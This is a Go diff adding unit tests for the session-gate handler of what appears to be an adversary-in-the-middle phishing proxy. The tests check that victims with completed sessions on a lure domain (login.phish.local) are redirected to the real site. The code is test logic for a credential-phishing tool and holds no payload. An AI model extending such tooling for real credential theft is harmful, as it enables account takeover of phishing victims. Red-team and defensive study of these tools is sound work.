@@ -134,6 +134,52 @@ func TestSessionGate_ValidLure_CreatesSession(t *testing.T) {
 	}
 }
 
+func TestSessionGate_CompletedSession_RedirectsToLureURL(t *testing.T) {
+	now := time.Now()
+	completedSess := &aitm.Session{ID: "done-sess", CompletedAt: &now}
+	h := &request.SessionGate{
+		Sessions: &stubSessionManager{getSession: completedSess},
+		Spoof:    &stubSpoofer{},
+	}
+	rec := httptest.NewRecorder()
+	ctx := &aitm.ProxyContext{
+		Lure:           &aitm.Lure{RedirectURL: "https://real-site.com/dashboard"},
+		ResponseWriter: rec,
+	}
+	req := newReq(http.MethodGet, "https://login.phish.local/dashboard", nil)
+	req.AddCookie(&http.Cookie{Name: "__ss", Value: "done-sess"})
+
+	err := h.Handle(ctx, req)
+	if !errors.Is(err, proxy.ErrShortCircuit) {
+		t.Fatalf("expected ErrShortCircuit for completed session, got %v", err)
+	}
+	if rec.Code != http.StatusFound {
+		t.Errorf("expected 302, got %d", rec.Code)
+	}
+	if got := rec.Header().Get("Location"); got != "https://real-site.com/dashboard" {
+		t.Errorf("Location = %q, want %q", got, "https://real-site.com/dashboard")
+	}
+}
+
+func TestSessionGate_CompletedSession_NoLure_ContinuesNormally(t *testing.T) {
+	now := time.Now()
+	completedSess := &aitm.Session{ID: "done-sess", CompletedAt: &now}
+	h := &request.SessionGate{
+		Sessions: &stubSessionManager{getSession: completedSess},
+		Spoof:    &stubSpoofer{},
+	}
+	ctx := &aitm.ProxyContext{} // no Lure
+	req := newReq(http.MethodGet, "https://login.phish.local/dashboard", nil)
+	req.AddCookie(&http.Cookie{Name: "__ss", Value: "done-sess"})
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Session != completedSess {
+		t.Error("expected session to be loaded even without lure redirect")
+	}
+}
+
 func TestSessionGate_SessionFactoryError_ReturnsError(t *testing.T) {
 	h := &request.SessionGate{
 		Sessions: &stubSessionManager{newErr: errors.New("db down")},
